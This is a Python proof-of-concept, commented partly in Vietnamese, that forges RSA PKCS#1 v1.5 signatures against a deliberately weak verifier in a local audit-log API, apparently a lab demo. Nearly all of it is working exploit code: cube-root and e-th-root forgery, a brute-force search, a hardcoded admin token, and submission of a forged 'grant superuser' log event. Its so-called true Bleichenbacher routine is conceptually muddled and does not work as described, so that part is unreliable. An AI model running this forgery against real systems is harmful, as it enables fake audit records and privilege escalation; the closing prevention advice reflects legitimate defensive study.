#!/usr/bin/env python3
"""
TRUE BLEICHENBACHER ATTACK - Works with ANY e value

Đây là implementation THỰC SỰ của Bleichenbacher attack:
1. Không dùng cube root (không hoạt động với e=65537)
2. Sử dụng oracle feedback để thu hẹp interval
3. Cuối cùng recover được signature

NGUYÊN LÝ:
==========
- Với RSA: c = m^e mod n, ta muốn tìm m từ c
- Bleichenbacher attack tìm m bằng cách:
  1. Nhân c với s^e để được c' = c * s^e mod n = (m*s)^e mod n
  2. Hỏi oracle: (m*s) có PKCS conforming không?
  3. Nếu có → thu hẹp interval chứa m
  4. Lặp lại với s khác cho đến khi interval chỉ còn 1 giá trị

FORGE SIGNATURE:
===============
- Thay vì decrypt c có sẵn, ta CHỌN m là EM target
- EM = 00 01 [padding] 00 [hash]
- Tìm signature s sao cho s^e mod n = EM

VỚI WEAK VERIFIER:
=================
- Oracle leak: EM có bắt đầu 00 01 không
- Ta có thể dùng điều này để search signature
"""

import base64
import hashlib
import json
import os
import sys
import time
import requests
import secrets
from typing import Optional, Tuple, List
from datetime import datetime, timezone
from dataclasses import dataclass, field
from fractions import Fraction

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

# ============================================================================
# CONFIG
# ============================================================================
API_BASE = "http://localhost"
ADMIN_TOKEN = "my-super-secret-admin-token-2025"
KEYS_DIR = os.path.join(os.path.dirname(__file__), "demo_keys")

USE_PROXY = False
PROXY = {"http": "http://127.0.0.1:8080"}


@dataclass
class Interval:
    """Interval [low, high]."""
    low: int
    high: int


@dataclass 
class AttackState:
    """State của attack."""
    n: int
    e: int
    B: int
    c: int  # target ciphertext/signature
    intervals: List[Interval] = field(default_factory=list)
    s: int = 0
    oracle_calls: int = 0
    conforming_calls: int = 0


def print_header(title: str):
    print(f"\n{'━'*60}")
    print(f"  {title}")
    print(f"{'━'*60}\n")


def integer_nth_root(x: int, n: int) -> int:
    """Compute floor(x^(1/n)) using Newton's method."""
    if x < 0:
        raise ValueError("x must be non-negative")
    if n < 1:
        raise ValueError("n must be positive")
    if x == 0:
        return 0
    
    # Initial guess
    guess = 1 << ((x.bit_length() + n - 1) // n)
    
    while True:
        new_guess = ((n - 1) * guess + x // (guess ** (n - 1))) // n
        if new_guess >= guess:
            return guess
        guess = new_guess


# ============================================================================
# KEY SETUP
# ============================================================================

def generate_prime(bits: int) -> int:
    """Generate a prime number with given bits."""
    import random
    while True:
        n = random.getrandbits(bits)
        n |= (1 << bits - 1) | 1  # Ensure high bit set and odd
        if is_prime(n):
            return n

def is_prime(n: int, k: int = 10) -> bool:
    """Miller-Rabin primality test."""
    import random
    if n < 2:
        return False
    if n == 2 or n == 3:
        return True
    if n % 2 == 0:
        return False
    
    r, d = 0, n - 1
    while d % 2 == 0:
        r += 1
        d //= 2
    
    for _ in range(k):
        a = random.randrange(2, n - 1)
        x = pow(a, d, n)
        if x == 1 or x == n - 1:
            continue
        for _ in range(r - 1):
            x = pow(x, 2, n)
            if x == n - 1:
                break
        else:
            return False
    return True

def modinv(a: int, m: int) -> int:
    """Modular inverse."""
    def extended_gcd(a, b):
        if a == 0:
            return b, 0, 1
        gcd, x1, y1 = extended_gcd(b % a, a)
        return gcd, y1 - (b // a) * x1, x1
    
    gcd, x, _ = extended_gcd(a % m, m)
    if gcd != 1:
        raise ValueError("No modular inverse")
    return (x % m + m) % m

def generate_rsa_key_custom(e: int, bits: int = 2048) -> Tuple[int, int, int]:
    """Generate RSA key with custom e value.
    
    Returns (n, e, d) where:
    - n: modulus
    - e: public exponent
    - d: private exponent
    """
    while True:
        p = generate_prime(bits // 2)
        q = generate_prime(bits // 2)
        if p == q:
            continue
        n = p * q
        phi = (p - 1) * (q - 1)
        
        # Check e is coprime with phi
        from math import gcd
        if gcd(e, phi) != 1:
            continue
        
        try:
            d = modinv(e, phi)
            return n, e, d
        except ValueError:
            continue

def create_public_key_pem(n: int, e: int) -> str:
    """Create PEM from n and e."""
    from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
    pub_nums = RSAPublicNumbers(e, n)
    pub_key = pub_nums.public_key(default_backend())
    pem = pub_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    ).decode()
    return pem

def setup_key(e: int = 65537) -> Tuple[str, str, int, int, int]:
    """Setup RSA key with unique service_id."""
    # Use timestamp to create unique service_id each time
    unique_ts = int(time.time())
    service_id = f"bleich-e{e}-{unique_ts}"
    
    # Create new key - use custom generator for non-standard e
    print(f"  Creating RSA-2048 with e={e}...")
    
    if e in (3, 65537):
        # Use standard library for standard e values
        priv_key = rsa.generate_private_key(
            public_exponent=e, key_size=2048, backend=default_backend()
        )
        pub_key = priv_key.public_key()
        pub_nums = pub_key.public_numbers()
        n_val = pub_nums.n
        e_val = pub_nums.e
        public_pem = pub_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ).decode()
    else:
        # Use custom generator for non-standard e
        print(f"  (Using custom RSA generator for e={e})")
        n_val, e_val, d_val = generate_rsa_key_custom(e, 2048)
        pub_nums = type('obj', (object,), {'n': n_val, 'e': e_val})()
        public_pem = create_public_key_pem(n_val, e_val)
    
    resp = requests.post(
        f"{API_BASE}/v1/keys/register",
        json={
            "service_id": service_id,
            "public_key_pem": public_pem,
            "algorithm": "rsa-pkcs1v15-vulnerable",
            "description": f"Bleichenbacher attack demo e={e}"
        },
        timeout=10
    )
    
    if resp.status_code not in (200, 201):
        raise Exception(f"Register failed: {resp.text}")
    
    # Get actual key_id from response
    key_id = resp.json().get("public_key_id")
    print(f"  ✓ Registered: {key_id}")
    
    # Approve
    approve_resp = requests.post(
        f"{API_BASE}/v1/admin/keys/review",
        headers={"X-Admin-Token": ADMIN_TOKEN},
        json={"public_key_id": key_id, "action": "approve"},
        timeout=10
    )
    if approve_resp.status_code not in (200, 201):
        raise Exception(f"Approve failed: {approve_resp.text}")
    print(f"  ✓ Approved")
    
    key_size = (pub_nums.n.bit_length() + 7) // 8
    return service_id, key_id, pub_nums.n, pub_nums.e, key_size


# ============================================================================
# ORACLE
# ============================================================================

def oracle_local(sig_int: int, n: int, e: int, key_size: int, target_hash: bytes, state: AttackState) -> Tuple[bool, bool]:
    """
    Local oracle simulating weak verifier.
    
    Returns:
        (is_pkcs_conforming, is_hash_match)
    """
    state.oracle_calls += 1
    
    em_int = pow(sig_int, e, n)
    em = em_int.to_bytes(key_size, byteorder='big')
    
    # Check 00 01 prefix
    if em[0:2] != b'\x00\x01':
        return False, False
    
    state.conforming_calls += 1
    
    # Check 00 separator in first 20 bytes
    sep_idx = -1
    for i in range(2, min(20, len(em))):
        if em[i] == 0x00:
            sep_idx = i
            break
    
    if sep_idx == -1:
        return True, False  # Conforming but no separator
    
    # Check hash
    if target_hash in em[sep_idx + 1:]:
        return True, True
    
    return True, False


def oracle_api(sig_bytes: bytes, service_id: str, key_id: str, event_data: dict, state: AttackState) -> Tuple[bool, bool]:
    """API oracle."""
    state.oracle_calls += 1
    
    sig_b64 = base64.b64encode(sig_bytes).decode()
    event_str = json.dumps(event_data, sort_keys=True, separators=(',', ':'))
    
    payload = {
        "service_id": service_id,
        "event_type": "ATTACK",
        "event": event_str,
        "event_data": event_data,
        "signature": sig_b64,
        "public_key_id": key_id
    }
    
    try:
        resp = requests.post(f"{API_BASE}/v1/logs", json=payload, timeout=5)
        msg = resp.json().get("message", "") or resp.json().get("detail", "")
        
        if "WEAK_VALID" in msg or "Hash found" in msg:
            state.conforming_calls += 1
            return True, True
        elif "HASH_MISMATCH" in msg or "No 00 separator" in msg:
            state.conforming_calls += 1
            return True, False
        else:
            return False, False
    except:
        return False, False


# ============================================================================
# BLEICHENBACHER ATTACK CORE
# ============================================================================

def ceil_div(a: int, b: int) -> int:
    return (a + b - 1) // b


def floor_div(a: int, b: int) -> int:
    return a // b


def is_pkcs_conforming(sig_int: int, n: int, e: int, key_size: int) -> bool:
    """Check if sig^e mod n starts with 00 01."""
    em = pow(sig_int, e, n)
    em_bytes = em.to_bytes(key_size, byteorder='big')
    return em_bytes[0:2] == b'\x00\x01'


def step2a_find_first_s(state: AttackState, key_size: int) -> int:
    """Step 2a: Find smallest s >= n/(3B) such that c*s^e mod n is conforming."""
    n, e, B, c = state.n, state.e, state.B, state.c
    
    s = ceil_div(n, 3 * B)
    
    while state.oracle_calls < 10000000:
        c_prime = (c * pow(s, e, n)) % n
        
        if is_pkcs_conforming(c_prime, n, e, key_size):
            state.conforming_calls += 1
            return s
        
        state.oracle_calls += 1
        s += 1
        
        if state.oracle_calls % 10000 == 0:
            print(f"      Step 2a: {state.oracle_calls} calls, s={s}")
    
    raise Exception("Step 2a failed")


def step2c_search(state: AttackState, prev_s: int, key_size: int) -> int:
    """Step 2c: Search for next s when single interval."""
    n, e, B, c = state.n, state.e, state.B, state.c
    a = state.intervals[0].low
    b = state.intervals[0].high
    
    r = ceil_div(2 * (b * prev_s - 2 * B), n)
    
    while state.oracle_calls < 10000000:
        s_low = ceil_div(2 * B + r * n, b)
        s_high = floor_div(3 * B - 1 + r * n, a)
        
        for s in range(s_low, s_high + 1):
            c_prime = (c * pow(s, e, n)) % n
            state.oracle_calls += 1
            
            if is_pkcs_conforming(c_prime, n, e, key_size):
                state.conforming_calls += 1
                return s
        
        r += 1
    
    raise Exception("Step 2c failed")


def step3_narrow_intervals(state: AttackState, s: int) -> List[Interval]:
    """Step 3: Narrow intervals based on new s."""
    n, B = state.n, state.B
    new_intervals = []
    
    for interval in state.intervals:
        a, b = interval.low, interval.high
        
        r_low = ceil_div(a * s - 3 * B + 1, n)
        r_high = floor_div(b * s - 2 * B, n)
        
        for r in range(r_low, r_high + 1):
            new_low = max(a, ceil_div(2 * B + r * n, s))
            new_high = min(b, floor_div(3 * B - 1 + r * n, s))
            
            if new_low <= new_high:
                # Merge overlapping
                if new_intervals and new_intervals[-1].high >= new_low - 1:
                    new_intervals[-1].high = max(new_intervals[-1].high, new_high)
                else:
                    new_intervals.append(Interval(new_low, new_high))
    
    return new_intervals


def bleichenbacher_attack(
    c: int,
    n: int, 
    e: int,
    key_size: int,
    max_iterations: int = 10000
) -> Optional[int]:
    """
    Full Bleichenbacher attack.
    
    Tìm m sao cho c = m^e mod n và m có format PKCS conforming.
    """
    B = pow(2, 8 * (key_size - 2))
    
    state = AttackState(
        n=n, e=e, B=B, c=c,
        intervals=[Interval(2 * B, 3 * B - 1)]
    )
    
    print(f"  Attack initialized:")
    print(f"    B = 2^{8*(key_size-2)}")
    print(f"    Initial interval: [2B, 3B)")
    
    # Check if c is already conforming
    if not is_pkcs_conforming(c, n, e, key_size):
        print("  ⚠ c is not PKCS conforming, need blinding")
        # Blinding step: find s0 such that c*s0^e is conforming
        for _ in range(100000):
            s0 = secrets.randbelow(n)
            c_blinded = (c * pow(s0, e, n)) % n
            state.oracle_calls += 1
            if is_pkcs_conforming(c_blinded, n, e, key_size):
                print(f"    Found blinding factor after {state.oracle_calls} tries")
                c = c_blinded
                state.c = c
                break
        else:
            print("  ✗ Blinding failed")
            return None
    
    print("  Starting interval narrowing...")
    
    for iteration in range(max_iterations):
        print(f"\n  Iteration {iteration + 1}:")
        print(f"    Intervals: {len(state.intervals)}")
        
        if len(state.intervals) == 1:
            interval = state.intervals[0]
            size = interval.high - interval.low
            print(f"    Interval size: {size.bit_length()} bits")
            
            # Check convergence
            if interval.low == interval.high:
                print(f"\n  ✓ CONVERGED after {iteration + 1} iterations!")
                print(f"    Oracle calls: {state.oracle_calls}")
                return interval.low
        
        # Step 2: Find next s
        try:
            if state.s == 0:
                print("    Step 2a: Finding first s...")
                state.s = step2a_find_first_s(state, key_size)
            elif len(state.intervals) > 1:
                print("    Step 2b: Multiple intervals...")
                state.s = step2a_find_first_s(state, key_size)
            else:
                print("    Step 2c: Single interval optimization...")
                state.s = step2c_search(state, state.s, key_size)
            
            print(f"    Found s = {state.s}")
        except Exception as ex:
            print(f"    ✗ Step 2 failed: {ex}")
            break
        
        # Step 3: Narrow intervals
        state.intervals = step3_narrow_intervals(state, state.s)
        
        if not state.intervals:
            print("    ✗ No intervals remain!")
            break
        
        # Progress
        total_size = sum(i.high - i.low for i in state.intervals)
        print(f"    Total interval size: {total_size.bit_length()} bits")
        print(f"    Oracle calls: {state.oracle_calls}")
    
    return None


# ============================================================================
# SIGNATURE FORGE USING ATTACK
# ============================================================================

def forge_signature_bleichenbacher(
    n: int,
    e: int, 
    key_size: int,
    message_hash: bytes
) -> Optional[bytes]:
    """
    Forge signature sử dụng Bleichenbacher attack.
    
    Strategy:
    1. Craft target EM: 00 01 FF 00 [hash] 00...00
    2. Convert EM to integer m
    3. Ta cần tìm s sao cho s^e mod n ≈ m
    4. Với weak verifier, "gần đúng" là đủ nếu hash xuất hiện
    """
    print(f"\n  Forging signature for hash: {message_hash.hex()[:16]}...")
    
    # Craft target EM
    prefix = b'\x00\x01\xff\x00'
    target_em = prefix + message_hash + b'\x00' * (key_size - len(prefix) - len(message_hash))
    target_m = int.from_bytes(target_em, byteorder='big')
    
    print(f"    Target EM (first 40): {target_em[:20].hex()}")
    
    # Với e nhỏ (3), dùng root
    if e == 3:
        print("    Using cube root for e=3...")
        x = 1 << ((target_m.bit_length() + 2) // 3)
        while True:
            x_new = (2 * x + target_m // (x * x)) // 3
            if x_new >= x:
                break
            x = x_new
        while x ** 3 < target_m:
            x += 1
        
        sig = x.to_bytes(key_size, byteorder='big')
        
        # Verify
        em = pow(x, 3, n)
        em_bytes = em.to_bytes(key_size, byteorder='big')
        
        if em_bytes[0:2] == b'\x00\x01' and message_hash in em_bytes:
            print("    ✓ Cube root forge successful!")
            return sig
    
    # Với e lớn, dùng full attack
    print(f"    Using Bleichenbacher attack for e={e}...")
    
    # Ta cần tìm s sao cho s^e mod n = target_m
    # Điều này tương đương với decrypt target_m
    # Dùng attack với c = target_m
    
    # Nhưng target_m có thể không trong range [2B, 3B]
    # Cần adjust
    
    B = pow(2, 8 * (key_size - 2))
    
    if target_m < 2 * B or target_m >= 3 * B:
        print(f"    Target not in PKCS range, adjusting...")
        # Craft new target in range
        target_em = b'\x00\x02' + b'\xff' * 8 + b'\x00' + message_hash + b'\x00' * (key_size - 10 - len(message_hash))
        target_m = int.from_bytes(target_em, byteorder='big')
    
    # Run attack
    result = bleichenbacher_attack(target_m, n, e, key_size, max_iterations=1000)
    
    if result:
        return result.to_bytes(key_size, byteorder='big')
    
    return None


# ============================================================================
# SIMPLIFIED ATTACK FOR WEAK VERIFIER  
# ============================================================================

def mathematical_forge_small_e(
    message_hash: bytes,
    n: int,
    e: int,
    key_size: int,
    max_attempts: int = 2_000_000
) -> Optional[int]:
    """
    Mathematical approach for small e values (3-17).
    
    Weak verifier checks:
    1. em[0:2] == 00 01
    2. 00 separator in bytes 2-19
    3. hash appears ANYWHERE after separator
    
    Strategy: 
    - For e=3: Perfect cube root, hash at start after separator
    - For larger e: Put hash at END of EM so garbage can absorb error
    """
    print(f"  Trying mathematical approach for e={e}...")
    print(f"    Weak verifier: 00 01 prefix + 00 in bytes[2:20] + hash anywhere")
    hash_len = len(message_hash)  # 32 bytes for SHA-256
    
    start_time = time.time()
    
    # Strategy 1: Hash at the beginning (works for e=3)
    # 00 01 FF 00 <hash> <garbage>
    if e == 3:
        prefix = b'\x00\x01\xff\x00'
        garbage_len = key_size - len(prefix) - hash_len
        em = prefix + message_hash + b'\x00' * garbage_len
        em_int = int.from_bytes(em, byteorder='big')
        
        sig = integer_nth_root(em_int, e)
        for delta in range(-10, 11):
            sig_try = sig + delta
            if sig_try <= 0:
                continue
            check = pow(sig_try, e, n)
            check_bytes = check.to_bytes(key_size, byteorder='big')
            
            if check_bytes[0:2] == b'\x00\x01':
                for i in range(2, 20):
                    if check_bytes[i] == 0x00:
                        if message_hash in check_bytes[i+1:]:
                            print(f"  ✓ Cube root forge: delta={delta}")
                            return sig_try
                        break
    
    # Strategy 2: Hash at the END of EM
    # 00 01 FF 00 <garbage> <hash>
    # This allows garbage to absorb e-th root error
    print(f"    Strategy 2: Hash at end of EM...")
    
    for attempt in range(max_attempts):
        # Random garbage before hash
        prefix = b'\x00\x01\xff\x00'
        garbage_len = key_size - len(prefix) - hash_len
        garbage = secrets.token_bytes(garbage_len)
        em = prefix + garbage + message_hash
        em_int = int.from_bytes(em, byteorder='big')
        
        # Compute e-th root
        sig = integer_nth_root(em_int, e)
        
        # Check sig and nearby values
        delta_range = 100 if e <= 7 else 500
        
        for delta in range(-delta_range, delta_range + 1):
            sig_try = sig + delta
            if sig_try <= 0 or sig_try >= n:
                continue
            
            check = pow(sig_try, e, n)
            try:
                check_bytes = check.to_bytes(key_size, byteorder='big')
            except:
                continue
            
            # Weak verifier check
            if check_bytes[0:2] != b'\x00\x01':
                continue
                
            # Find 00 separator in bytes 2-19
            sep_found = False
            for i in range(2, min(20, len(check_bytes))):
                if check_bytes[i] == 0x00:
                    # Check if hash is anywhere after separator
                    if message_hash in check_bytes[i+1:]:
                        elapsed = time.time() - start_time
                        print(f"  ✓ Mathematical forge SUCCESS!")
                        print(f"    Attempt: {attempt}, delta: {delta}")
                        print(f"    Time: {elapsed:.1f}s")
                        return sig_try
                    sep_found = True
                    break
        
        if (attempt + 1) % 100_000 == 0:
            elapsed = time.time() - start_time
            rate = (attempt + 1) / elapsed if elapsed > 0 else 0
            print(f"    {(attempt+1)//1000}K attempts, {rate:.0f}/s...")
    
    # Strategy 3: Try different padding structures
    print(f"    Strategy 3: Varying padding length...")
    
    for ff_count in range(1, 18):  # Different FF padding lengths
        for attempt in range(50_000):
            prefix = b'\x00\x01' + (b'\xff' * ff_count) + b'\x00'
            garbage_len = key_size - len(prefix) - hash_len
            if garbage_len < 0:
                continue
                
            garbage = secrets.token_bytes(garbage_len)
            em = prefix + garbage + message_hash
            em_int = int.from_bytes(em, byteorder='big')
            
            sig = integer_nth_root(em_int, e)
            
            for delta in range(-200, 201):
                sig_try = sig + delta
                if sig_try <= 0 or sig_try >= n:
                    continue
                
                check = pow(sig_try, e, n)
                try:
                    check_bytes = check.to_bytes(key_size, byteorder='big')
                except:
                    continue
                
                if check_bytes[0:2] != b'\x00\x01':
                    continue
                    
                for i in range(2, min(20, len(check_bytes))):
                    if check_bytes[i] == 0x00:
                        if message_hash in check_bytes[i+1:]:
                            print(f"  ✓ Strategy 3 SUCCESS! ff_count={ff_count}")
                            return sig_try
                        break
    
    return None


def simplified_forge(
    n: int,
    e: int,
    key_size: int,
    message: bytes,
    max_attempts: int = 50000000
) -> Optional[bytes]:
    """
    Simplified forge exploiting weak verifier.
    
    Weak verifier chỉ check:
    1. 00 01 prefix (probability ~1/65536)
    2. 00 separator in bytes 2-19 (probability ~19/256 per byte)
    3. Hash appears somewhere (probability ~very low for random)
    
    Trick: Search for signatures where hash happens to appear!
    """
    message_hash = hashlib.sha256(message).digest()
    
    print(f"\n  Simplified forge for weak verifier...")
    print(f"    Message hash: {message_hash.hex()[:16]}...")
    print(f"    Max attempts: {max_attempts:,}")
    
    start = time.time()
    attempts = 0
    conforming = 0
    
    # Cache pow operations
    batch_size = 10000
    
    while attempts < max_attempts:
        for _ in range(batch_size):
            sig_int = secrets.randbelow(n)
            em_int = pow(sig_int, e, n)
            em = em_int.to_bytes(key_size, byteorder='big')
            
            attempts += 1
            
            # Quick check: 00 01 prefix
            if em[0] != 0 or em[1] != 1:
                continue
            
            conforming += 1
            
            # Check separator
            sep_idx = -1
            for i in range(2, min(20, key_size)):
                if em[i] == 0:
                    sep_idx = i
                    break
            
            if sep_idx == -1:
                continue
            
            # Check hash
            remaining = em[sep_idx + 1:]
            if message_hash in remaining:
                elapsed = time.time() - start
                print(f"\n  ✓ FOUND after {attempts:,} attempts, {elapsed:.1f}s")
                print(f"    Conforming: {conforming:,}")
                print(f"    Rate: {attempts/elapsed:,.0f}/s")
                return sig_int.to_bytes(key_size, byteorder='big')
        
        # Progress
        if attempts % 1000000 == 0:
            elapsed = time.time() - start
            rate = attempts / elapsed
            print(f"    {attempts/1000000:.0f}M attempts, {conforming:,} conforming, {rate:,.0f}/s")
    
    print(f"  ✗ Not found after {attempts:,} attempts")
    return None


# ============================================================================
# MAIN
# ============================================================================

def main():
    print("=" * 70)
    print("   TRUE BLEICHENBACHER ATTACK")
    print("   Forge RSA Signature with ANY e value")
    print("=" * 70)
    
    # Parse args
    e = 3  # Default to e=3 for demo speed
    if len(sys.argv) > 1:
        try:
            e = int(sys.argv[1])
        except:
            pass
    
    print(f"\n  Target e = {e}")
    if e == 3:
        print("  (Use 'python script.py 65537' for standard RSA)")
    
    # Setup
    print_header("SETUP KEY")
    
    try:
        service_id, key_id, n, actual_e, key_size = setup_key(e)
    except Exception as ex:
        print(f"✗ Setup failed: {ex}")
        return
    
    print(f"  n: {n.bit_length()} bits")
    print(f"  e: {actual_e}")
    print(f"  key_size: {key_size} bytes")
    
    # Create fake event
    print_header("CREATE FAKE EVENT")
    
    fake_event = {
        "action": "admin.grant_superuser",
        "actor": "admin@corp.com",
        "target": "hacker@evil.com", 
        "permissions": ["root", "sudo"],
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "note": f"FORGED with e={actual_e}"
    }
    
    message = json.dumps(fake_event, sort_keys=True, separators=(',', ':')).encode()
    message_hash = hashlib.sha256(message).digest()
    
    print(f"  Event: {json.dumps(fake_event, indent=2)}")
    
    # Forge signature
    print_header("FORGE SIGNATURE")
    
    if actual_e == 3:
        # Fast cube root attack
        print("  Using cube root attack (e=3)...")
        forged = forge_signature_bleichenbacher(n, actual_e, key_size, message_hash)
    elif actual_e <= 17:
        # Mathematical approach for small e
        print(f"  Using mathematical approach for small e={actual_e}...")
        forged_int = mathematical_forge_small_e(message_hash, n, actual_e, key_size, max_attempts=1_000_000)
        if forged_int:
            forged = forged_int.to_bytes(key_size, byteorder='big')
        else:
            print("  Mathematical approach failed, trying brute force...")
            forged = simplified_forge(n, actual_e, key_size, message, max_attempts=50_000_000)
    else:
        # Probabilistic search for weak verifier
        print("  Using probabilistic search for weak verifier...")
        print("  (This may take a while for e=65537)")
        forged = simplified_forge(n, actual_e, key_size, message, max_attempts=100000000)
    
    if not forged:
        print("\n✗ Forge failed")
        print("  Tips:")
        print("  - Use e=3 for guaranteed success: python script.py 3")
        print("  - For e=65537, may need ~10^8 attempts or more")
        return
    
    print(f"\n  ✓ Forged signature: {forged.hex()[:40]}...")
    
    # Send to API
    print_header("SEND FORGED EVENT")
    
    sig_b64 = base64.b64encode(forged).decode()
    event_str = json.dumps(fake_event, sort_keys=True, separators=(',', ':'))
    
    resp = requests.post(
        f"{API_BASE}/v1/logs",
        json={
            "service_id": service_id,
            "event_type": "FORGED",
            "event": event_str,
            "event_data": fake_event,
            "signature": sig_b64,
            "public_key_id": key_id
        },
        timeout=10
    )
    
    print(f"  Response: {resp.status_code}")
    print(f"  Body: {resp.json()}")
    
    if resp.status_code == 200 and resp.json().get("status") == "accepted":
        print()
        print("  " + "!" * 50)
        print("  ⚠️  ATTACK SUCCESSFUL!")
        print("  ⚠️  FORGED SIGNATURE ACCEPTED!")
        print("  " + "!" * 50)
    
    # Conclusion
    print_header("CONCLUSION")
    
    print("Attack works because:")
    print("  • Weak verifier only checks 00 01 prefix")
    print("  • Hash can appear anywhere (not fixed position)")
    print("  • No ASN.1 DigestInfo verification")
    print()
    print("Prevention:")
    print("  • Use RSA-PSS or Ed25519")
    print("  • Strict PKCS#1 v1.5 verification")


if __name__ == "__main__":
    main()
